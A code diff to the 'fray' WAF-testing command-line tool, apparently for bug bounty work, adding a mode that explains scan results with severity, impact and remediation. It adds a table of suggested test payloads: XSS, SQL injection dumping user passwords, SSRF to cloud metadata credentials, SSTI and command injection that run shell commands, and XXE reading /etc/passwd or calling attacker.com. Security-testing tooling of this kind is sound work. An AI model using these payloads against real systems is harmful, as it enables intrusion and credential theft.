@@ -22,6 +22,7 @@ Usage:
     fray validate <url>          Blue team WAF config validation report
     fray bounty --platform h1    Bug bounty scope auto-fetch + batch test
     fray explain <CVE-ID>       Explain a CVE — payloads, severity, what to test
+    fray explain results.json    Explain scan findings — impact, remediation, next steps
     fray demo [url]             Quick showcase: detect WAF + XSS scan (great for GIFs)
     fray version                Show version
 """
@@ -885,7 +886,383 @@ def cmd_scope(args):
         print_scope(scope, filepath=args.scope_file)
 
 
+def _explain_findings(filepath: str, verbose: bool = False):
+    """Explain scan/test results in human-readable format for bug bounty hunters."""
+    import re as _re
+
+    bold = "\033[1m"
+    dim = "\033[2m"
+    reset = "\033[0m"
+    red = "\033[91m"
+    yellow = "\033[93m"
+    green = "\033[92m"
+    magenta = "\033[95m"
+    cyan = "\033[96m"
+
+    try:
+        with open(filepath, encoding="utf-8") as f:
+            data = json.load(f)
+    except (json.JSONDecodeError, OSError) as exc:
+        print(f"\n  {red}Error:{reset} Cannot read '{filepath}': {exc}")
+        sys.exit(1)
+
+    # Normalise: support both cmd_test report and cmd_scan ScanResult formats
+    target = data.get("target", "unknown")
+    summary = data.get("summary", {})
+    results = data.get("results", data.get("test_results", []))
+    crawl = data.get("crawl", {})
+    duration = data.get("duration", "N/A")
+
+    # Separate findings by risk level
+    reflected = [r for r in results if r.get("reflected") and not r.get("blocked")]
+    bypassed = [r for r in results if not r.get("blocked") and not r.get("reflected")]
+    blocked = [r for r in results if r.get("blocked")]
+
+    # ── Vulnerability knowledge base ──
+    vuln_info = {
+        "xss": {
+            "name": "Cross-Site Scripting (XSS)",
+            "icon": "\U0001f534",
+            "severity": "HIGH",
+            "why": "User input appears in the response without proper encoding. An attacker can inject JavaScript that runs in victims' browsers, stealing session cookies, credentials, or performing actions on their behalf.",
+            "impact": ["Session hijacking via cookie theft", "Credential harvesting with fake login forms", "Keylogging user inputs", "Defacement or phishing redirect"],
+            "fix": ["HTML-encode all user input before rendering", "Set Content-Security-Policy header", "Use HttpOnly + Secure cookie flags"],
+            "cwe": "CWE-79",
+        },
+        "sqli": {
+            "name": "SQL Injection",
+            "icon": "\U0001f534",
+            "severity": "CRITICAL",
+            "why": "User input is incorporated into SQL queries without parameterization. An attacker can read, modify, or delete database contents, and potentially execute system commands.",
+            "impact": ["Full database extraction (users, passwords, PII)", "Authentication bypass (login as admin)", "Data modification or deletion", "Remote code execution (via xp_cmdshell, INTO OUTFILE)"],
+            "fix": ["Use parameterized queries / prepared statements", "Use an ORM layer", "Apply least-privilege database permissions"],
+            "cwe": "CWE-89",
+        },
+        "ssrf": {
+            "name": "Server-Side Request Forgery (SSRF)",
+            "icon": "\U0001f7e0",
+            "severity": "HIGH",
+            "why": "The server can be tricked into making requests to internal resources. An attacker can access cloud metadata endpoints, internal APIs, and services not exposed to the internet.",
+            "impact": ["Steal cloud credentials (AWS keys, GCP tokens)", "Access internal admin panels and databases", "Port scan internal network", "Pivot to deeper attacks"],
+            "fix": ["Allowlist permitted destination hosts", "Block private IP ranges (10.x, 172.16.x, 169.254.x)", "Disable HTTP redirects in server-side clients"],
+            "cwe": "CWE-918",
+        },
+        "ssti": {
+            "name": "Server-Side Template Injection (SSTI)",
+            "icon": "\U0001f534",
+            "severity": "CRITICAL",
+            "why": "User input is rendered inside a server-side template engine. An attacker can execute arbitrary code on the server, leading to full system compromise.",
+            "impact": ["Remote code execution on the server", "Read sensitive files (/etc/passwd, config)", "Reverse shell access", "Lateral movement in the network"],
+            "fix": ["Never pass user input directly to template engines", "Use sandboxed template environments", "Validate and sanitize all inputs"],
+            "cwe": "CWE-1336",
+        },
+        "command_injection": {
+            "name": "OS Command Injection",
+            "icon": "\U0001f534",
+            "severity": "CRITICAL",
+            "why": "User input is passed to a system shell command. An attacker can execute arbitrary OS commands, taking full control of the server.",
+            "impact": ["Full server compromise", "Data exfiltration", "Install backdoors or ransomware", "Pivot to internal network"],
+            "fix": ["Never pass user input to shell commands", "Use language-level APIs instead of shell exec", "Allowlist expected input patterns"],
+            "cwe": "CWE-78",
+        },
+        "xxe": {
+            "name": "XML External Entity (XXE)",
+            "icon": "\U0001f7e0",
+            "severity": "HIGH",
+            "why": "The XML parser processes external entity references. An attacker can read local files, perform SSRF, or cause denial of service.",
+            "impact": ["Read server files (/etc/passwd, config)", "SSRF to internal services", "Denial of service (billion laughs)", "Port scanning"],
+            "fix": ["Disable external entity processing in XML parser", "Use JSON instead of XML", "Validate and sanitize XML input"],
+            "cwe": "CWE-611",
+        },
+        "path_traversal": {
+            "name": "Path Traversal",
+            "icon": "\U0001f7e0",
+            "severity": "HIGH",
+            "why": "User input controls file paths without proper validation. An attacker can read arbitrary files from the server filesystem.",
+            "impact": ["Read source code and configuration files", "Access credentials and API keys", "Read /etc/passwd and /etc/shadow", "Access other users' data"],
+            "fix": ["Validate file paths against an allowlist", "Use chroot or sandboxed file access", "Strip ../ sequences and null bytes"],
+            "cwe": "CWE-22",
+        },
+        "open-redirect": {
+            "name": "Open Redirect",
+            "icon": "\U0001f7e1",
+            "severity": "MEDIUM",
+            "why": "The application redirects users to a URL controlled by attacker input. This enables phishing attacks that appear to originate from the trusted domain.",
+            "impact": ["Phishing — redirect to fake login page", "OAuth token theft via redirect_uri", "Bypass domain-based security filters", "Chain with SSRF for internal access"],
+            "fix": ["Allowlist permitted redirect destinations", "Use relative redirects only", "Validate redirect URL against same-origin"],
+            "cwe": "CWE-601",
+        },
+        "crlf_injection": {
+            "name": "CRLF Injection / HTTP Response Splitting",
+            "icon": "\U0001f7e0",
+            "severity": "MEDIUM",
+            "why": "User input is included in HTTP headers without filtering newlines. An attacker can inject additional headers or split the response to perform XSS or cache poisoning.",
+            "impact": ["HTTP response splitting", "Cache poisoning", "Session fixation", "XSS via injected headers"],
+            "fix": ["Strip \\r\\n from all header values", "Use framework header-setting functions", "Validate header values"],
+            "cwe": "CWE-113",
+        },
+        "prototype_pollution": {
+            "name": "Prototype Pollution",
+            "icon": "\U0001f7e0",
+            "severity": "HIGH",
+            "why": "User-controlled input modifies JavaScript object prototypes. An attacker can inject properties that affect all objects, leading to denial of service, privilege escalation, or remote code execution.",
+            "impact": ["Denial of service", "Privilege escalation (isAdmin = true)", "Remote code execution via gadget chains", "Authentication bypass"],
+            "fix": ["Freeze Object.prototype", "Use Map instead of plain objects", "Validate and sanitize recursive merge operations"],
+            "cwe": "CWE-1321",
+        },
+        "host_header_injection": {
+            "name": "Host Header Injection",
+            "icon": "\U0001f7e0",
+            "severity": "MEDIUM",
+            "why": "The application trusts the Host header for generating URLs. An attacker can poison password reset links, cache entries, or trigger SSRF.",
+            "impact": ["Password reset link poisoning", "Web cache poisoning", "SSRF via Host header", "Virtual host routing bypass"],
+            "fix": ["Hardcode the server hostname in config", "Validate Host header against allowlist", "Ignore X-Forwarded-Host from untrusted sources"],
+            "cwe": "CWE-644",
+        },
+    }
+
+    default_info = {
+        "name": "Security Finding",
+        "icon": "\u26a0\ufe0f",
+        "severity": "MEDIUM",
+        "why": "A payload bypassed the WAF and was not blocked. This indicates a gap in the security configuration that could be exploited.",
+        "impact": ["WAF bypass — attacker payloads reach the application", "Potential exploitation depending on application behavior"],
+        "fix": ["Review WAF rules for this payload pattern", "Add application-level input validation"],
+        "cwe": "CWE-693",
+    }
+
+    sev_colors = {"CRITICAL": red, "HIGH": red, "MEDIUM": yellow, "LOW": green}
+
+    # ── Header ──
+    print(f"\n{bold}Fray Findings Report{reset}")
+    print("━" * 64)
+    print(f"  {bold}Target:{reset}    {target}")
+    print(f"  {bold}Duration:{reset}  {duration}")
+    total = summary.get("total", summary.get("total_tested", len(results)))
+    blk = summary.get("blocked", 0)
+    psd = summary.get("passed", 0)
+    refl = summary.get("reflected", 0)
+    br = summary.get("block_rate", "N/A")
+    print(f"  {bold}Tested:{reset}    {total} payloads")
+    print(f"  {bold}Blocked:{reset}   {blk}  |  {bold}Passed:{reset} {psd}  |  {bold}Reflected:{reset} {refl}")
+    print(f"  {bold}Block Rate:{reset} {br}")
+
+    # ── Crawl info (from fray scan) ──
+    if crawl:
+        pages = crawl.get("pages_crawled", 0)
+        eps = crawl.get("total_endpoints", 0)
+        ips = crawl.get("total_injection_points", 0)
+        if pages:
+            print(f"  {bold}Crawled:{reset}   {pages} pages, {eps} endpoints, {ips} injection points")
+
+    # ── Critical: Reflected findings ──
+    if reflected:
+        print(f"\n{'━' * 64}")
+        print(f"  {red}{bold}\U0001f6a8 CRITICAL — {len(reflected)} Reflected Finding(s){reset}")
+        print(f"  {red}Payload appeared in the response — confirmed exploitable{reset}")
+        print(f"{'━' * 64}")
+
+        # Group by category
+        by_cat = {}
+        for r in reflected:
+            cat = r.get("category", "unknown")
+            by_cat.setdefault(cat, []).append(r)
+
+        for cat, items in by_cat.items():
+            info = vuln_info.get(cat, default_info)
+            sev_color = sev_colors.get(info["severity"], yellow)
+
+            print(f"\n  {info['icon']} {bold}{info['name']}{reset} ({sev_color}{info['severity']}{reset}) — {bold}{len(items)} reflected{reset}")
+            print(f"  {bold}CWE:{reset} {info['cwe']}")
+            print()
+            print(f"  {bold}Why this matters:{reset}")
+            print(f"  {info['why']}")
+            print()
+            print(f"  {bold}Impact:{reset}")
+            for imp in info["impact"]:
+                print(f"    • {imp}")
+            print()
+
+            print(f"  {bold}Findings:{reset}")
+            for i, r in enumerate(items[:10]):
+                payload = r.get("payload", "")
+                status = r.get("status", "?")
+                # Detect endpoint from payload context
+                endpoint = r.get("url", r.get("endpoint", target))
+                param = r.get("param", "input")
+                if len(payload) > 100:
+                    payload = payload[:97] + "..."
+                badge = f"{red}↩ REFLECTED{reset}"
+                print(f"\n    {dim}#{i+1}{reset} {badge} HTTP {status}")
+                print(f"    {bold}Endpoint:{reset} {endpoint}")
+                if param:
+                    print(f"    {bold}Parameter:{reset} {param}")
+                print(f"    {bold}Payload:{reset}  {cyan}{payload}{reset}")
+
+            if len(items) > 10:
+                print(f"\n    {dim}... and {len(items) - 10} more reflected findings{reset}")
+
+            print()
+            print(f"  {bold}Suggested test payloads:{reset}")
+            _print_suggested_payloads(cat)
+
+            print()
+            print(f"  {bold}Remediation:{reset}")
+            for fix in info["fix"]:
+                print(f"    \u2192 {fix}")
+
+            print()
+            print(f"  {bold}Next steps:{reset}")
+            print(f"    {dim}# Reproduce and capture evidence:{reset}")
+            print(f"    curl -v '{target}?{param}=<script>alert(document.domain)</script>'")
+            print(f"    {dim}# Generate a report for submission:{reset}")
+            print(f"    fray report -i {filepath} -o report.html")
+            print(f"    fray report -i {filepath} -o report.md --format markdown")
+
+    # ── High: Bypassed (not blocked, not reflected) ──
+    if bypassed:
+        print(f"\n{'━' * 64}")
+        print(f"  {yellow}{bold}\u26a0\ufe0f  WARNING — {len(bypassed)} Bypassed Finding(s){reset}")
+        print(f"  {yellow}Payload passed the WAF but was not reflected in response{reset}")
+        print(f"{'━' * 64}")
+
+        by_cat = {}
+        for r in bypassed:
+            cat = r.get("category", "unknown")
+            by_cat.setdefault(cat, []).append(r)
+
+        for cat, items in by_cat.items():
+            info = vuln_info.get(cat, default_info)
+            sev_color = sev_colors.get(info["severity"], yellow)
+
+            print(f"\n  {info['icon']} {bold}{info['name']}{reset} ({sev_color}{info['severity']}{reset}) — {bold}{len(items)} bypassed{reset}")
+            print()
+            print(f"  {bold}Why this matters:{reset}")
+            print(f"  The WAF did not block these payloads. While not confirmed exploitable")
+            print(f"  (no reflection detected), the application may still be vulnerable.")
+            print(f"  Manual testing is recommended to confirm impact.")
+            print()
+
+            print(f"  {bold}Top bypassed payloads:{reset}")
+            for i, r in enumerate(items[:5]):
+                payload = r.get("payload", "")
+                status = r.get("status", "?")
+                if len(payload) > 100:
+                    payload = payload[:97] + "..."
+                print(f"    {dim}#{i+1}{reset} HTTP {status} — {cyan}{payload}{reset}")
+
+            if len(items) > 5:
+                print(f"    {dim}... and {len(items) - 5} more{reset}")
+
+            print()
+            print(f"  {bold}Next steps:{reset}")
+            print(f"    {dim}# Test with reflection detection:{reset}")
+            print(f"    fray test {target} -c {cat} --smart --max 50")
+            print(f"    {dim}# Try different injection points:{reset}")
+            print(f"    fray scan {target} -c {cat} --depth 3")
+
+    # ── Blocked summary ──
+    if blocked and not reflected and not bypassed:
+        print(f"\n{'━' * 64}")
+        print(f"  {green}{bold}\u2705 ALL PAYLOADS BLOCKED{reset}")
+        print(f"  The WAF blocked all {len(blocked)} tested payloads.")
+        print(f"  {bold}Recommendation:{reset} Try adaptive/smart mode for deeper testing:")
+        print(f"    fray test {target} --smart --max 100")
+        print(f"    fray test {target} -c xss,sqli,ssrf --smart")
+        print(f"{'━' * 64}")
+    elif blocked:
+        blk_by_cat = {}
+        for r in blocked:
+            cat = r.get("category", "unknown")
+            blk_by_cat.setdefault(cat, []).append(r)
+        print(f"\n  {green}{bold}\u2705 Blocked:{reset} {len(blocked)} payloads across {len(blk_by_cat)} categories")
+
+    # ── Overall risk assessment ──
+    print(f"\n{'━' * 64}")
+    print(f"  {bold}Overall Risk Assessment{reset}")
+    print(f"{'━' * 64}")
+    if reflected:
+        print(f"\n  {red}{bold}CRITICAL{reset} — {len(reflected)} confirmed exploitable finding(s)")
+        print(f"  Immediate action required. File bug bounty reports for reflected payloads.")
+        print(f"\n  {bold}Quick commands:{reset}")
+        print(f"    fray report -i {filepath} -o report.html")
+        print(f"    fray bounty --urls targets.txt -o bounty_report.json")
+    elif bypassed:
+        print(f"\n  {yellow}{bold}MEDIUM{reset} — {len(bypassed)} WAF bypass(es), no confirmed reflection")
+        print(f"  Manual verification needed. The WAF has gaps that should be addressed.")
+        print(f"\n  {bold}Quick commands:{reset}")
+        print(f"    fray test {target} --smart --max 100")
+        print(f"    fray scan {target} --depth 5")
+    else:
+        print(f"\n  {green}{bold}LOW{reset} — WAF blocked all payloads")
+        print(f"  Good defensive posture. Consider testing with more categories.")
+        print(f"\n  {bold}Quick commands:{reset}")
+        print(f"    fray test {target} -c sqli,ssrf,ssti,command_injection --smart")
+
+    print(f"\n{'━' * 64}\n")
+
+
+def _print_suggested_payloads(category: str):
+    """Print 3 suggested test payloads for a category."""
+    dim = "\033[2m"
+    cyan = "\033[96m"
+    reset = "\033[0m"
+
+    suggestions = {
+        "xss": [
+            '<script>alert(document.domain)</script>',
+            '<img src=x onerror=alert(1)>',
+            '<svg/onload=confirm(document.cookie)>',
+        ],
+        "sqli": [
+            "' OR 1=1--",
+            "' UNION SELECT null,username,password FROM users--",
+            "1; WAITFOR DELAY '0:0:5'--",
+        ],
+        "ssrf": [
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://127.0.0.1:8080/admin",
+            "http://[::1]/server-status",
+        ],
+        "ssti": [
+            "{{7*7}}",
+            "${7*7}",
+            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        ],
+        "command_injection": [
+            "; id",
+            "| cat /etc/passwd",
+            "$(whoami)",
+        ],
+        "xxe": [
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>',
+            '<!ENTITY % xxe SYSTEM "file:///etc/hostname"> %xxe;',
+        ],
+        "path_traversal": [
+            "../../etc/passwd",
+            "..%2f..%2fetc%2fpasswd",
+            "....//....//etc/passwd",
+        ],
+    }
+
+    payloads = suggestions.get(category, [
+        "Use fray payloads to browse available payloads for this category",
+        f"fray test <target> -c {category} --smart --max 20",
+    ])
+    for p in payloads[:3]:
+        print(f"    {cyan}{p}{reset}")
+
+
 def cmd_explain(args):
+    """Explain a CVE or scan results — dual mode based on input."""
+    # If the argument looks like a file path to a JSON file, explain findings
+    input_arg = args.cve_id
+    if input_arg.endswith('.json') and Path(input_arg).exists():
+        _explain_findings(input_arg, verbose=getattr(args, 'verbose', False))
+        return
+
+    # Otherwise, fall through to CVE explanation mode
     """Explain a CVE — show payloads, affected versions, severity, and what to test"""
     import glob
 
@@ -1132,6 +1509,7 @@ def cmd_help(args):
   fray bounty --platform hackerone   Bug bounty integration
   fray diff before.json after.json   Compare scan results (regression testing)
   fray explain CVE-2021-44228   Explain a CVE with payloads and severity
+  fray explain results.json      Explain scan findings: impact, why it matters, next steps
   fray demo                     Quick showcase: detect WAF + XSS scan
   fray learn xss                Interactive CTF-style security tutorial
   fray ci init                  Generate GitHub Actions workflow for CI/CD
@@ -1509,8 +1887,8 @@ Documentation: https://github.com/dalisecurity/fray
     p_init_config.set_defaults(func=cmd_init_config)
 
     # explain
-    p_explain = subparsers.add_parser("explain", help="Explain a CVE — payloads, severity, affected versions, what to test")
-    p_explain.add_argument("cve_id", help="CVE ID or name (e.g. CVE-2021-44228, log4shell, react2shell)")
+    p_explain = subparsers.add_parser("explain", help="Explain a CVE or scan results — human-readable findings with impact & remediation")
+    p_explain.add_argument("cve_id", help="CVE ID (e.g. CVE-2021-44228) or results JSON file (e.g. results.json)")
     p_explain.add_argument("--max", type=int, default=5, help="Max payloads to show per CVE (default: 5)")
     p_explain.add_argument("--json", action="store_true", help="Output as JSON")
     p_explain.add_argument("-o", "--output", help="Save JSON output to file")
